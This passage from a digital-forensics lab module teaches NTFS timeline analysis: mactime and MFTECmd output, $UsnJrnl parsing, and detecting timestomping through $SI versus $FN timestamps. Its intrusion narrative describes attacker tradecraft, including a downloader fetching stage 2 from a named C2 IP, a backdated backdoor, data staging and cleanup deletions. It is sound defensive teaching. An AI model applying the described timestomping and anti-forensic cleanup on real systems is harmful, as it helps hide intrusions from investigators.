- **`fls … -m C:`** — emit **bodyfile** output, prefixing every path with the drive letter `C:`. (`-m` is what switches `fls` from a listing to a bodyfile.)
- **`-r`/`-o 2048`** — recurse / partition offset, as before.
- **`mactime -b fls.body`** — read that **b**odyfile.
- **`-d`** — output as **CSV** (comma-delimited).
- **`-z UTC`** — interpret/label times in **UTC** (keep every timeline source in the same zone so they line up when you merge them).

**Real output (the rows that matter, from `timeline.csv`):**
```
Fri Mar 15 2019 12:00:00 , 77 , ma.b , r/r... , 79-128-2 , "C:/Windows/Temp/coreupdater.exe"
Mon Jun 15 2026 09:10:05 , 93 , ma.b , -/r... , 80-128-2 , "C:/Users/mortysmith/AppData/Local/Temp/update.ps1 (deleted)"
Mon Jun 15 2026 09:12:33 , 96 , m.cb , r/r... , 79-48-3  , "C:/Windows/Temp/coreupdater.exe ($FILE_NAME)"
Mon Jun 15 2026 09:20:15 , 12984 , .a.b , -/r... , 81-128-2 , "C:/Users/mortysmith/Downloads/loot.zip (deleted)"
```
**How to read a `mactime` line:** time, size, then the **`macb`** flag field — **m**odified / **a**ccessed / **c**hanged(MFT) / **b**orn(created) — a letter present means *that* timestamp falls on this line's time; a dot means it doesn't. So `ma.b` = this is the file's Modified+Accessed+Born moment.

**Read the story — and the trap:**
- The **`$SI`-based** line for `coreupdater.exe` (`79-128-2`) lands way back in **March 2019** with `ma.b`. **If you trusted the standard timeline, you'd never connect the backdoor to the intrusion.**
- But the **`$FILE_NAME`** line for the same file (`79-48-3`) sits right in the intrusion window, **Jun 15 2026 09:12:33** — *that's* when the backdoor was really created.
- The deleted `update.ps1` (09:10) and `loot.zip` (09:20) bracket it. A clean kill-chain: **drop downloader → drop & timestomp backdoor → stage `loot.zip` → delete the evidence**, all inside ten minutes.

> **Why `$FN` saves you:** `mactime` on a plain `fls` bodyfile keys off `$SI` — exactly the times the attacker faked. Because the bodyfile also includes the `$FILE_NAME` rows (the `(... $FILE_NAME)` lines), the **true** creation time is right there next to the fake one. This is the timeline equivalent of the `istat` comparison in Step 5.

> **Scale tip — window the timeline to the incident.** A real `$MFT` has hundreds of thousands of rows; you rarely read them all. `mactime` takes an inclusive **date range** as a trailing argument, so once `istat`/MFTECmd have handed you the window (here ~09:10-09:20 on 2026-06-15) you can collapse the whole timeline to just it:
> ```bash
> mactime -b fls.body -d -z UTC 2026-06-15..2026-06-16 > timeline_incident.csv
> ```
> **Real output** — the entire kill-chain, eight rows and nothing else: `update.ps1` created **09:10:05**, `coreupdater.exe`'s `$FILE_NAME` (true) create at **09:12:33**, `loot.zip` staged **09:20:15** — each deleted/timestomped artefact next to its `$FILE_NAME` truth-time. **That** focused CSV is what goes in the report; the full timeline stays as the appendix you can defend.

#### Same timeline, from MFTECmd (the `$MFT` route)
MFTECmd can emit a bodyfile too, so you can build the same timeline from the parsed `$MFT` (useful when all you were handed is the `$MFT`, not a full image):
```bash
MFTECmd -f MFT --body . --bodyf mft.body --bdl C
mactime -b mft.body -d -z UTC > timeline_mft.csv
```
- **`--body .`** — write a TSK **bodyfile** into the current folder.
- **`--bodyf mft.body`** — its filename.
- **`--bdl C`** — the **b**ody **d**rive **l**etter to prefix (`C`).

Either route gives you the **filesystem half of a super-timeline**.

### Step 8 — The change journal: MFTECmd on `$UsnJrnl:$J`

The `$MFT` shows the disk's *current* state; the **`$UsnJrnl` change journal** shows the *history of changes* — including files that were created and then deleted, and the exact moment a file was timestomped. Because a USN record **outlives the file it describes**, the journal is both the third pillar of timestomp convergence and the durable record of an attacker's staging-and-cleanup. This module ships `UsnJrnl_J` — the raw `$J` stream carved from a volume that recorded the same intrusion (host `DESKTOP-SDN1RPT`, user `mortysmith`). Parse it exactly the way you parsed the `$MFT`; MFTECmd auto-detects the USN record format:

```bash
MFTECmd -f UsnJrnl_J --csv . --csvf usnjrnl.csv
```
- **`-f UsnJrnl_J`** — the raw `$J` stream. It was carved with `icat` from `$Extend\$UsnJrnl:$J` — the *same* `icat`-by-attribute technique you used to pull the `$MFT` in Step 6 (`icat -o 128 usn.vhd 38-128-3` — on the separate scratch volume that generated this artifact, illustrating the technique — where `38-128-3` is `$UsnJrnl`'s `$DATA` stream named `$J`).
- Each row is one change: a **name**, a **UTC timestamp**, the file and parent MFT references (for path reconstruction), and a **reason** (`UpdateReasons`) — the bitwise-OR reason set decoded to text.

Now read just the three columns that tell the story — name, time, reason:
```bash
cut -d, -f1,9,10 usnjrnl.csv
```
The attacker's whole sequence is there, in order (abridged):
```
cu.tmp           …37.6148492   FileCreate            <- payload staged under an innocuous temp name
cu.tmp           …37.6293930   RenameOldName         <- ...then renamed
coreupdater.exe  …37.6293930   RenameNewName         <- ...into place  (RENAME = this pair)
coreupdater.exe  …37.6433303   DataExtend            <- payload bytes written
update.ps1       …37.6458383   FileCreate            <- second-stage script dropped
loot.zip         …37.6458383   FileCreate            <- collection archive dropped
coreupdater.exe  …37.9843261   BasicInfoChange       <- the TIMESTOMP (metadata rewrite)
update.ps1       …38.3119259   FileDelete|Close      <- cleanup
loot.zip         …38.3119259   FileDelete|Close      <- cleanup
```

**Read it like an examiner:**
- **`RenameOldName` on `cu.tmp` immediately followed by `RenameNewName` on `coreupdater.exe`** *is* a rename — a move always emits this pair, so matching them reconstructs the attacker staging the payload under a throwaway name and renaming it into place.
- **`BasicInfoChange` on `coreupdater.exe`** is the journal's fingerprint of the **timestomp**: `$SI` was rewritten, and the journal logged the event with the **real** wall-clock time (`…37.98`) even though `istat`/MFTECmd now show that file's `$SI` claiming 2019. This is the independent third artifact that Step 5's `$SI`-vs-`$FN` split and Step 6's `uSecZeros` flag converge with — three sources, one instant.
- **`FileDelete|Close` on `update.ps1` and `loot.zip`** proves they existed and were removed. The journal remembers the **names and timing** of deleted tooling even after the `$MFT` records are reused — often the only place they survive.
- The `FileCreate|Close` rows for `Windows`, `Users`, `mortysmith`, … are benign directory scaffolding, and `IndexerVolumeGuid` / `$TxfLog.blf` are normal OS bookkeeping. **Filter to the reasons and names that matter** (`FileDelete`, `RenameOldName`, `BasicInfoChange`) rather than reading every row — the journal-searching technique from the Background.

> **Why this is the durable pillar.** The `$LogFile` (MFT record 2) records the same events at finer grain but wraps in minutes-to-hours; the `$UsnJrnl` keeps its higher-level record for **days**. Every row above — the rename, the timestomp, the two deletions — outlived the action that produced it. On a live host you would carve `$J` from `\$Extend\$UsnJrnl:$J` with `icat` (or MFTECmd's raw-volume mode) exactly as this artifact was made.

*(The shipped `UsnJrnl_J` is **inert**: it was generated on a scratch NTFS volume driven through this exact benign sequence — the files held only an `MZ` header plus a marker string, never any code — then carved with `icat`. The generator is `data/build-usnjrnl.ps1`; the journal is pure filesystem-change metadata, no executable content.)*

### Step 9 — Where the heavier tooling fits (Plaso)
A full **super-timeline** merges the filesystem (this module) with registry, EVTX (Module 5), Prefetch (Module 1), Amcache (Module 3), browser history, and more, into one sorted file. The standard one-shot merger is **Plaso** (`log2timeline.py` to ingest everything, `psort.py` to sort/filter).

> **Tool gap (verified on the lab VM, 2026-06-29):** **Plaso is *not* installed** on the lab VM — `which log2timeline.py psort.py` returns nothing. That's deliberate (Plaso is heavy). Until it's added, build the timeline **per layer** as you did here — TSK `fls`+`mactime` and MFTECmd for the filesystem, `EvtxECmd` for logs (Module 5), RegRipper for the registry — and **merge them in Timeline Explorer** (all EZ output and `mactime -d` CSV are easy to load and sort together). Adding Plaso is a recommended future enhancement to the lab VM, not a requirement for this lesson.

---

## 5. Reading the output — suspicious vs. benign

| Signal | Where you see it | Benign looks like… | Suspicious looks like… |
|---|---|---|---|
| `$SI` vs `$FN` Created | `istat`; MFTECmd `SI<FN` / `Created0x30` | equal (set together) | **`$SI` earlier than `$FN`** → timestomp |
| Sub-second precision | `istat`; MFTECmd `uSecZeros` | both sets keep nanoseconds | `$SI` ends in `.0000000` while `$FN` doesn't |
| Deleted (`*` / `InUse=False`) | `fls -d`; MFTECmd `InUse` | temp/installer churn | tools/scripts/archives deleted right after use |
| File location | `fls -r -p` | apps under `Program Files` | executables in `\Temp`, `\Users\…\Downloads`, `\AppData` |
| `mactime` `$SI` vs `$FN` rows | `timeline.csv` | the two agree | a file's `$SI` row is far from its `$FN` row |

**Triage discipline:** an old creation date is **not** by itself suspicious — real OS files are old (that's why `win32k.sys` is in the data). What's suspicious is an **inconsistency**: `$SI` older than `$FN`, whole-second `$SI`, an executable in a Temp folder, a tool deleted minutes after it ran. Judge the **combination**, and let MFTECmd's `SI<FN`/`uSecZeros` columns and your deleted-file list point you at the few records worth a hard look. On a full image, add the **third pillar of convergence**: parse the `$UsnJrnl` (MFTECmd auto-detects it as `$J`) and look for a **`USN_REASON_BASIC_INFO_CHANGE`** record landing in the incident window — when the `$SI`-vs-`$FN` split, the zeroed sub-seconds, and the journal entry all point at the *same* instant, the timestomp is beyond dispute.

---

## 6. Investigative narrative — the story the disk tells

Reconstructing `DESKTOP-SDN1RPT` from the filesystem alone:

1. **09:10:05** — a PowerShell downloader, `update.ps1`, is written to the user's `AppData\Local\Temp`. Its recovered contents (`icat`) show it pulling stage-2 from `http://45.77.13.37/c2.ps1`.
2. **09:12:33** — the backdoor **`coreupdater.exe`** is created in `C:\Windows\Temp` (its **`$FN`** time — the truth). The attacker immediately **timestomps** it, backdating `$SI` to *2019-03-15* with whole-second precision to make it blend in with genuine OS files like `win32k.sys`.
3. **09:20:15** — stolen data is staged as `loot.zip` (~13 KB) in `Downloads`.
4. **Cleanup** — `update.ps1` and `loot.zip` are **deleted** to cover tracks.

Every one of those steps survived in the filesystem: the deletions were recoverable (clusters intact), and the timestomp was self-defeating because the attacker could only forge **one** of NTFS's two timestamp sets. The `$SI` timeline said "2019, nothing to see here"; the `$FN` timeline, `istat`, and MFTECmd's `SI<FN` flag said "**09:12:33 on the morning of the intrusion.**" That is the power of disk forensics: it remembers what the operating system — and the attacker — tried to forget.

---

## 7. Try-it-yourself exercises

1. **Find the offset yourself.** Run `mmls` and read the NTFS partition's Start sector. Then run `fls -r -p` with the wrong offset (e.g. `-o 0`) and with the right one (`-o 2048`). Explain what you get each time and *why* the offset matters.
2. **Recover and verify.** `icat` entry **81** to `recovered_loot.zip`, confirm `wc -c` reports **12984** bytes and the file starts with `PK`. Why can a deleted file still be recovered in full?
3. **Prove the stomp two ways.** For `coreupdater.exe` (entry **79**): (a) from `istat`, write the one sentence that proves timestomping; (b) find the same file in `mft.csv` and confirm `SI<FN` and `uSecZeros` are both **True**. Which method scales to a 500,000-record `$MFT`, and why?
4. **Spot the control.** Compare `istat` for `win32k.sys` (75) and `coreupdater.exe` (79). Both have a 2019 `$SI` creation date — what *single* difference tells you one is genuinely old and the other is faked?
5. **Build and read the timeline.** Run the `fls -m` → `mactime` pipeline. In `timeline.csv`, find the **two** lines for `coreupdater.exe` (`79-128-2` and `79-48-3`). What is each one's date, which attribute does each come from, and which one would you put in your report?
6. **(Stretch)** Run `get-data.sh`, download the **real** DFIR Madness Case 001 desktop image, and repeat Steps 1-7 against it — including carving the real `$MFT` with `icat … 0` and running MFTECmd. Did the real attacker timestomp anything?

---

## 8. Key takeaways

- A disk image is read in **layers**: `mmls` (partitions) → `fsstat`/`fls` (filesystem & files) → `istat`/`icat` (one file's metadata & bytes). TSK does all of it **offline and read-only** — it never mounts the evidence.
- The partition **offset from `mmls`** (`-o 2048` here) is required by nearly every other TSK command. Always run `mmls` first.
- **Deleted ≠ gone.** `fls -d` lists deleted files and `icat -r` recovers their bytes until the clusters are reused — that's how you pull back a wiped dropper or staged archive.
- NTFS keeps **two** timestamp sets. `$SI` is forgeable; `$FN` is kernel-written. **`$SI` Created earlier than `$FN` Created = timestomping**, and **whole-second `$SI`** is a second tell. `istat` shows both; MFTECmd flags them automatically as **`SI<FN`** and **`uSecZeros`**.
- `fls -m` + `mactime` (or `MFTECmd --body`) builds the **filesystem timeline** — the spine of a super-timeline. Because it carries the `$FN` rows, it survives an attacker who only stomped `$SI`. Pass `mactime` a trailing **date range** (`2026-06-15..2026-06-16`) to window a huge timeline down to the incident.
- A full super-timeline normally uses **Plaso** to merge every artifact; Plaso is **not** on the lab VM, so here you timeline per-layer and merge in Timeline Explorer.

---

## 9. Sources & further reading

- The Sleuth Kit — official site & wiki (per-tool man pages: `mmls`, `fls`, `icat`, `istat`, `mactime`): <https://www.sleuthkit.org/> · <https://github.com/sleuthkit/sleuthkit/wiki>
- Brian Carrier, *File System Forensic Analysis* (Addison-Wesley) — the definitive reference for NTFS internals and the TSK layers.
- MFTECmd & Timeline Explorer — Eric Zimmerman: <https://github.com/EricZimmerman/MFTECmd> · <https://ericzimmerman.github.io/>
- AboutDFIR — MFTECmd reference & command cheatsheet (`$MFT`/`$J`/`$LogFile` parsing, the timestomp columns): <https://aboutdfir.com/toolsandartifacts/windows/mft-explorer-mftecmd/>
- Kroll — "Detecting and Analyzing Timestomping with KAPE" — the `$SI`-vs-`$FN` + `$UsnJrnl` convergence method in practice: <https://www.kroll.com/>
- Microsoft Learn — NTFS Master File Table and the `$STANDARD_INFORMATION` / `$FILE_NAME` attributes (the two timestamp sets).
- 13Cubed (Richard Davis) — "NTFS Timestamps / Timestomping", "MFT & the $UsnJrnl", and "MFTECmd" episodes (the `$SI` vs `$FN`, sub-second-precision, and `USN_REASON_BASIC_INFO_CHANGE` detection).
- **Filesystem timelining & super-timeline methodology (public references)** — bodyfile→`mactime` (TSK `mactime` man page: <https://www.sleuthkit.org/sleuthkit/man/mactime.html>) and `$MFT`/`$UsnJrnl` parsing (MFTECmd: <https://github.com/EricZimmerman/MFTECmd>; MS Learn `USN_RECORD_V2`: <https://learn.microsoft.com/en-us/windows/win32/api/winioctl/ns-winioctl-usn_record_v2>). Brian Carrier, *File System Forensic Analysis* (above) remains the reference text for the NTFS internals.
- Plaso / log2timeline — the super-timeline merger (heavier alternative, not installed on the lab VM): <https://plaso.readthedocs.io/>
- DFIR Madness — "The Stolen Szechuan Sauce" (Case 001), the intrusion the lab's narrative is built on: <https://dfirmadness.com/the-stolen-szechuan-sauce/>

---
*This is an advanced add-on module. Prerequisites: the artifact modules it ties together — [Module 1 (Prefetch)](../module-01-prefetch-pecmd), [Module 3 (Amcache)](../module-03-amcache-amcacheparser), [Module 5 (EvtxECmd)](../module-05-evtx-evtxecmd) — and it feeds straight into the [Capstone](../module-11-capstone) super-timeline.*


---

## Sources

- **The Sleuth Kit (mmls, fls, istat, icat, mactime, fsstat)** — [The Sleuth Kit commands (TSK wiki)](https://github.com/sleuthkit/sleuthkit/wiki/The_Sleuth_Kit_commands)
- **The Sleuth Kit — project / engine under Autopsy (Brian Carrier)** — [sleuthkit/sleuthkit](https://github.com/sleuthkit/sleuthkit)
- **mactime — building the filesystem timeline / bodyfile** — [mactime (TSK wiki)](https://github.com/sleuthkit/sleuthkit/wiki/mactime)
- **MFTECmd — $MFT / $J / $LogFile parser (Eric Zimmerman)** — [EricZimmerman/MFTECmd](https://github.com/EricZimmerman/MFTECmd)
- **$SI vs $FN timestamps — timestomping detection** — [SANS: Digital Forensics — Detecting time stamp manipulation](https://www.sans.org/blog/digital-forensics-detecting-time-stamp-manipulation)
- **Timestomping (technique + $SI/$FN kernel-vs-user distinction)** — [MITRE ATT&CK T1070.006: Indicator Removal — Timestomp](https://attack.mitre.org/techniques/T1070/006/)
- **$UsnJrnl change journal — USN reason codes** — [Microsoft Learn: Change Journals](https://learn.microsoft.com/en-us/windows/win32/fileio/change-journals)
- **Zone.Identifier ADS / Mark-of-the-Web (ZoneId, HostUrl)** — [MS-FSCC 2.1.5.11 Zone.Identifier Stream Name](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-fscc/6e3f7352-d11c-4d76-8c39-2516a9df36e8)
